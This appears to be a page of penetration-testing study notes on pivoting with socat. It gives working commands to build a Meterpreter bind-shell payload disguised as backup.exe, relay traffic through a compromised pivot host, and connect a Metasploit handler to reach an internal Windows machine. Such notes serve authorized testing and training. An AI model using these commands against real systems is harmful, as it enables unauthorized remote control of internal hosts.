-- -
A bidirectional relay tool. Creates a pipe socket between 2 independent network channels w/o needing to use ssh tunneling. You need to run the relay from the pivot host, so you **might** need to download socat, [[Dark Arts I/File Transfer/~Home|file transfer]] it to the pivot host and run it there. 
### High-level overview
The workflow here is that you will create a bind shell on the target internal host. The pivot host will then redirect a stage request from your attackbox to the port where the bind shell is establishing the bind shell:![[55.webp]]
### Create payload
first, create a bind shell payload for the target internal host, in this case a windows internal host:
```bash
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8443 -f exe -o backup.exe
```
[[Dark Arts I/File Transfer/~Home|File transfer]] payload to pivot host, then to target internal host. Then run the payload on internal host.
### Setup Relay
On the pivot host, start the socat relay. Note that you **might** need to [[Dark Arts I/File Transfer/~Home|file transfer]] socat to the pivot host to use it.
```bash
socat TCP4-LISTEN:8080,fork TCP4:<target ip>:8443
```
### Setup Bind Listener
```bash
msfconsole
use multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST <pivot ip>
set lport <8080>
run
```